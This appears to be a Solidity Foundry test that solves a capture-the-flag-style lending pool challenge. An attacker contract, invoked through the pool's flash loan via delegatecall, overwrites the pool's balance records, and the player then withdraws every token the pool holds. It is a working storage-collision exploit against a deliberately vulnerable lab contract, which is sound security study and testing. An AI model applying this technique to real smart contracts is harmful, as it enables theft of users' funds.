// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/1.sol";
import "../src/tokens/tokenInsecureum.sol";

/// @dev Using this contract to perform the delegatecall that will overwrite the state value of balances
contract ContractAttacker {

    IERC20 public token;
    mapping(address => uint) public balances;
    constructor(){}
    bool private _flashLoan;
    function attack(address _address, uint value) external {
        balances[_address] = value;
    }
}


contract InSecureumLenderPoolTest is Test {
    InSecureumLenderPool target;
    InSecureumToken token;
    ContractAttacker attacker;
    address player;
    function setUp() public {

        token = new InSecureumToken(100);
        attacker = new ContractAttacker();
        target = new InSecureumLenderPool(address(token));
        token.transfer(address(target) ,100);
        uint256 balance = token.balanceOf(address(target));
        emit log_named_uint("target balance", balance);
        player = vm.addr(1);
        vm.deal(player, 100 ether);
    }

    function testComplete() public {
        vm.startPrank(player);
        target.flashLoan(
            address(attacker),
            abi.encodeWithSelector(
                ContractAttacker.attack.selector, 
                player, 
                token.balanceOf(address(target))
            )
        );
        uint256 playerBalance = target.balances(player);
        emit log_named_uint("player balance", playerBalance);
        target.withdraw(target.balances(player));

        assertEq(token.balanceOf(address(target)), 0);
    }
}
